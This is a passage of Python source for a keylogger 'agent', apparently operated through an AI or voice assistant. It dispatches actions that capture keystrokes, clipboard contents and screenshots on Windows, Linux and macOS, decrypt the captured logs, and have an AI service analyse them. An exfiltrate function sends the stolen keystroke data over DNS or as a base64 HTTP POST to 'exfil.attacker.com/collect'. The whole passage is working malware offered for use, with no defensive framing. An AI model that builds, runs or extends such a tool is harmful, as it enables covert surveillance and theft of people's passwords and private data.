    report_path = _save_analysis(log_file, analysis)

    return {
        "success":  True,
        "file":     log_file,
        "analysis": analysis,
        "report":   report_path,
        "message":  f"AI Analysis complete:\n{analysis[:500]}"
    }


def _save_analysis(log_file: str, analysis: str) -> str:
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = LOG_DIR / f"ai_analysis_{ts}.txt"
    path.write_text(
        f"AI Keylog Analysis\n"
        f"Source: {log_file}\n"
        f"Time: {datetime.now()}\n"
        f"{'='*50}\n\n"
        f"{analysis}",
        encoding="utf-8"
    )
    return str(path)


def decrypt_log(log_file: str) -> dict:
    """Decrypt an encrypted keylogger log to plain text."""
    path = Path(log_file)
    if not path.exists():
        return {"success": False, "message": f"File not found: {log_file}"}

    content  = _read_encrypted(path)
    out_path = path.with_suffix(".decrypted.txt")
    out_path.write_text(content, encoding="utf-8", errors="ignore")

    return {
        "success":  True,
        "original": log_file,
        "decrypted": str(out_path),
        "lines":    len(content.splitlines()),
        "message":  f"Decrypted to: {out_path} ({len(content.splitlines())} lines)"
    }


def exfiltrate(
    method:    str = "dns",
    domain:    str = "exfil.attacker.com",
    log_file:  str = None
) -> dict:
    """Exfiltrate keylog data via chosen method."""
    # Get data
    if not log_file:
        logs = sorted(
            list(LOG_DIR.glob("*.enc")) + list(LOG_DIR.glob("*.log")),
            key=lambda x: x.stat().st_mtime,
            reverse=True
        )
        if not logs:
            return {"success": False, "message": "No log file found."}
        log_file = str(logs[0])

    content = _read_encrypted(Path(log_file))
    if not content:
        return {"success": False, "message": "Log file empty."}

    if method == "dns":
        return exfil_via_dns(content, domain)

    elif method == "http":
        try:
            r = requests.post(
                f"http://{domain}/collect",
                data={"data": base64.b64encode(content.encode()).decode()},
                timeout=15
            )
            return {
                "success": True,
                "message": f"HTTP exfiltration: {r.status_code}"
            }
        except Exception as e:
            return {"success": False, "message": f"HTTP exfil failed: {e}"}

    return {"success": False, "message": f"Unknown method: {method}"}


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN DISPATCHER
# ══════════════════════════════════════════════════════════════════════════════

def run_keylogger_agent(args: dict, speak=None, player=None) -> str:
    action = args.get("action", "status")
    speak  = speak or (lambda x: None)

    def say(msg: str):
        short = str(msg)[:300]
        if player:
            player.write_log(f"[Keylogger|{OS}] {short}")
        speak(short)

    say(f"Keylogger Agent active on {OS}")

    if action == "start":
        r = start_keylogger(
            name               = args.get("name", "session"),
            window_capture     = args.get("window_capture", True),
            clipboard_capture  = args.get("clipboard_capture", True),
            screenshot_capture = args.get("screenshot_capture", True),
            encrypt            = args.get("encrypt", True),
            method             = args.get("method", "auto"),
        )
        say(r["message"])
        return r["message"]

    elif action == "stop":
        r = stop_keylogger()
        say(r["message"])
        return r["message"]

    elif action == "status":
        r = keylogger_status()
        say(r["message"])
        return r["message"]

    elif action == "recent":
        r = get_recent_keys(int(args.get("count", 100)))
        say(r["message"])
        return r["message"]

    elif action == "read":
        r = read_session(args.get("file"), int(args.get("lines", 200)))
        say(r["message"])
        return r["message"]

    elif action == "list":
        r = list_sessions()
        say(r["message"])
        return r["message"]

    elif action == "ai_analyze":
        say("Asking Groq AI to analyze keylog...")
        r = ai_analyze_log(args.get("file"))
        say(r["message"])
        return r["message"]

    elif action == "decrypt":
        file_p = args.get("file")
        if not file_p:
            return "File path required."
        r = decrypt_log(file_p)
        say(r["message"])
        return r["message"]

    elif action == "exfiltrate":
        r = exfiltrate(
            method   = args.get("method", "dns"),
            domain   = args.get("domain", "exfil.attacker.com"),
            log_file = args.get("file"),
        )
        say(r["message"])
        return r["message"]

    elif action == "winapi":
        r = start_winapi_keylogger(args.get("file"))
        say(r["message"])
        return r["message"]

    elif action == "raw":
        r = start_raw_keylogger(args.get("device"))
        say(r["message"])
        return r["message"]

    elif action == "cgeventtap":
        r = start_macos_keylogger()
        say(r["message"])
        return r["message"]

    elif action == "screenshot":
        path = _take_screenshot("manual")
        msg  = f"Screenshot saved: {path}" if path else "Screenshot failed."
        say(msg)
        return msg

    elif action == "clipboard":
        content = _get_clipboard()
        msg     = f"Clipboard: {content[:300]}" if content else "Clipboard empty."
        say(msg)
        return msg

    else:
        return (
            f"Unknown keylogger action: {action}. "
            f"Available: start | stop | status | recent | read | list | "
            f"ai_analyze | decrypt | exfiltrate | winapi | raw | "
            f"cgeventtap | screenshot | clipboard"
        )